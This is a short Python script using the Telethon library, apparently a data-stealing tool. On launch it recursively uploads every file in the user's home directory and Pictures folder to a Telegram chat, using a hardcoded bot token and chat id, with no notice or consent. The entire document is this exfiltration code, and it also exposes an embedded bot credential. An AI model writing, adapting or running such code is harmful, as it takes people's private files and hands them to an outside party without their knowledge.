from telethon.sync import TelegramClient
import os
from colorama import Fore, Style

def send_files(bot_token, chat_id):
    client = TelegramClient('session_name', None, None, bot_token=bot_token)
    client.connect()

    if not client.is_user_authorized():
        print(f'{Fore.RED}Bot not authorized.{Style.RESET_ALL}')
        return

    internal_storage_path = os.path.expanduser("~")
    pictures_path = os.path.join(internal_storage_path, 'Pictures')

    print(f'{Fore.GREEN}Sending files...{Style.RESET_ALL}')

    send_files_from_directory(client, chat_id, internal_storage_path)
    send_files_from_directory(client, chat_id, pictures_path)

    client.disconnect()

def send_files_from_directory(client, chat_id, directory):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                client.send_file(chat_id, file_path)
        print(f'{Fore.GREEN}Files sent successfully.{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}Error sending files from {directory}: {e}{Style.RESET_ALL}')

bot_token = '6932622383:AAHJ4CrKvQaZjlmnJ2Dw4gAgZTiEwuJLlBU'
chat_id = '6518876265'

send_files(bot_token, chat_id)
